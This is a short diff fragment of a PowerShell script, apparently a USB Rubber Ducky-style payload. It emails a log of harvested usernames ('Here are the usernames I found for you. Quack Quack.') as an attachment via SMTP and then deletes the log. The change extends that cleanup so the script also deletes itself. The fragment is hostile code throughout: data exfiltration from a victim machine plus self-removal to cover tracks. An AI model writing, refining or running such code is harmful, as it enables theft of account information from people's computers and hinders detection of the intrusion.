@@ -11,4 +11,4 @@ $ReportEmail.Body = 'Here are the usernames I found for you. Quack Quack.';
 $ReportEmail.Attachments.Add('C:\Users\Public\log.txt');
 $SMTPInfo.Send($ReportEmail);
 $ReportEmail.Dispose();
-Remove-Item 'C:\Users\Public\log.txt';
+Remove-Item 'C:\Users\Public\log.txt', 'C:\Users\Public\script.ps1';
